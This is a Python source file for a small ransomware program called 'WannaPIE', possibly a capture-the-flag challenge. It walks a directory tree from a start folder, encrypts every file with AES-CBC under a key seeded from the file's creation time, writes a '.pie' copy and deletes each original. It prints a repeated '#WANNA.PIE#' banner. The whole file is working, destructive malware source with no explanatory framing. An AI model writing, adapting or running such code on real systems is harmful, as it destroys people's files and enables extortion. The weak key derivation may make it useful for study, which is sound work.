#!/usr/bin/python3.7

import string, os, random, time, binascii
from Crypto.Cipher import AES

class WannaPIE():
    def __init__(self, startpath='home'):
        self._MODE = AES.MODE_CBC
        self._SIZE = 0x10
        self._startpath = startpath

    def pad_file(self, in_file):
        length = self._SIZE - (len(in_file) % self._SIZE)
        in_file += chr(length).encode("utf-8") * length
        return in_file

    def make_epoch(self, file):
        stat = os.stat(file)
        time_epoch = stat.st_ctime
        print(time_epoch)
        return time_epoch

    def generate_random(self, N):
        return ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(N))

    def generate_key(self, file):
        random.seed(int(self.make_epoch(file)))
        key = self.generate_random(self._SIZE)
        iv = self.generate_random(self._SIZE)
        print("KEY\t: ", key.encode("utf-8").hex())
        print("IV\t: ", iv.encode("utf-8").hex())
        return key, iv

class Encrypt(WannaPIE):
    def message(self):
        out = []
        wannapie = "#WANNA.PIE#??!!"
        return "".join(filter(None, [wannapie for _ in range(78)]))

    def encrypt(self, in_filename, out_filename=None):
        if not out_filename:
            out_filename = in_filename + '.pie'

        with open(in_filename, 'rb') as infile:
            data = self.pad_file(infile.read())

        key, iv = WannaPIE.generate_key(self, in_filename)
        aes = AES.new(key, self._MODE, iv)
        enc = aes.encrypt(data)

        with open(out_filename, 'wb') as outfile:
            outfile.write(enc)

    def recursive_enc(self):
        count = 0
        startPath = self._startpath
        for root, dirnames, filenames in os.walk(startPath):
            print("Current Dir : {}".format(root))
            for files in filenames:
                try:
                    count += 1
                    print("Encrypting >> " + files)
                    self.encrypt(os.path.join(root, files))
                    os.remove(os.path.join(root, files))
                except IOError:
                    print("Cannot open file!")

        print("Encrypted Files : ", count)
        print("Done :)")

    def run(self):
        print(self.message())
        self.recursive_enc()

if __name__ == "__main__":
    Encrypt().run() 
